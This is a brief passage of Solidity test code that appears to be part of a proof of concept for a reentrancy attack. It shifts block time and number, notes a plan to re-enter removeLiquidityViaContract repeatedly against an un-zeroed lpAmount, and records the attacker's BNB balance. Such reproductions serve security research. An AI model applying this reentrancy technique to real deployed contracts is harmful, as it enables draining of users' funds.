        vm.warp(block.timestamp + 1 hours);
        vm.roll(block.number + 1);

        // Step 2: re-enter removeLiquidityViaContract `LOOPS` times against the same un-zeroed lpAmount.
        uint256 attackerBnbBefore = ATTACKER.balance;
